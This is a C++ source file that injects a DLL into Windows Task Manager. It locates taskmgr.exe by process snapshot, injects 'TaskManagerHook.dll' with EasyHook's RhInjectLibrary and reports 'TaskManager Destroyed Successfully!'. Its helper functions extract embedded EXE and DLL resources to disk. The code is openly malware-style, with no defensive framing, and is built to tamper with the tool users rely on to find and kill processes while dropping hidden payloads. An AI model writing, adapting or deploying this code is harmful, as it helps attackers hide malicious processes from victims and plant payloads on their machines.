#include "DestroyTaskManager.h"

void InjectIntoProcess(DWORD processID)
{
	//Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);
	//Also Need To Extract The Dll
	WCHAR* dllToInject = L"C:\\Windows\\TaskManagerHook.dll";
	NTSTATUS nt = RhInjectLibrary(
		processID,   // The process to inject into
		0,           // ThreadId to wake up upon injection
		EASYHOOK_INJECT_DEFAULT,
		NULL, // 32-bit (not needed since most targets are 64-bit)
		dllToInject,		 // 64-bit not provided
		NULL, // data to send to injected DLL entry point
		0// size of data to send
	);

	if (nt != 0)
	{
		MessageBoxA(NULL, "Failed!", "Failed!", MB_OK | MB_ICONHAND | MB_TOPMOST);
		//AllocConsole(); //Basically we open the console to print output!
		printf("RhInjectLibrary failed with error code = %d\n", nt); //the error code
		PWCHAR err = RtlGetLastErrorString();
		std::wcout << err << "\n";
		//FreeConsole(); //we hide the console back
	}
	else
	{
		MessageBoxA(NULL, "TaskManager Destroyed Successfully!.", "Success!", MB_OK | MB_ICONINFORMATION | MB_TOPMOST); //Done!
	}

	CloseHandle(hProcess); //We finally close all handles to that process, so that we prevent memory from leaking
}

int KillTaskManager()
{
	DWORD processID = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32W processEntry; // Note the 'W' suffix for wide-character version
		processEntry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &processEntry)) { // Use Process32FirstW
			do {
				if (_wcsicmp(processEntry.szExeFile, L"taskmgr.exe") == 0) { // Use _wcsicmp for wide-character strings
					processID = processEntry.th32ProcessID;
					break;
				}
			} while (Process32NextW(snapshot, &processEntry)); // Use Process32NextW
		}

		CloseHandle(snapshot);

		if (processID != 0) {
			InjectIntoProcess(processID);
		}
		else {
			//wprintf(L"Task Manager is not running.\n");
			return 1;
		}
	}
	//Done!
	return 0;
}

bool ExtractResourceExe(int iId, LPCWSTR pDest) {
    HRSRC aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"EXE");
    if (!aResourceH) {
        MessageBoxA(NULL, "Unable to find resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    HGLOBAL aResourceHGlobal = LoadResource(NULL, aResourceH);
    if (!aResourceHGlobal) {
        MessageBoxA(NULL, "Unable to load resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    unsigned char* aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
    if (!aFilePtr) {
        MessageBoxA(NULL, "Unable to lock resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    unsigned long aFileSize = SizeofResource(NULL, aResourceH);

    HANDLE file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (INVALID_HANDLE_VALUE == file_handle) {
        int err = GetLastError();
        if ((ERROR_ALREADY_EXISTS == err) || (32 == err)) {
            return true;
        }
        return false;
    }

    unsigned long numWritten;
    WriteFile(file_handle, aFilePtr, aFileSize, &numWritten, NULL);
    CloseHandle(file_handle);

    return true;
}
bool ExtractResourceDll(int iId, LPCWSTR pDest) {
    HRSRC aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
    if (!aResourceH) {
        MessageBoxA(NULL, "Unable to find resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    HGLOBAL aResourceHGlobal = LoadResource(NULL, aResourceH);
    if (!aResourceHGlobal) {
        MessageBoxA(NULL, "Unable to load resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    unsigned char* aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
    if (!aFilePtr) {
        MessageBoxA(NULL, "Unable to lock resource.", "", MB_OK | MB_ICONHAND);
        return false;
    }

    unsigned long aFileSize = SizeofResource(NULL, aResourceH);

    HANDLE file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (INVALID_HANDLE_VALUE == file_handle) {
        int err = GetLastError();
        if ((ERROR_ALREADY_EXISTS == err) || (32 == err)) {
            return true;
        }
        return false;
    }

    unsigned long numWritten;
    WriteFile(file_handle, aFilePtr, aFileSize, &numWritten, NULL);
    CloseHandle(file_handle);

    return true;
}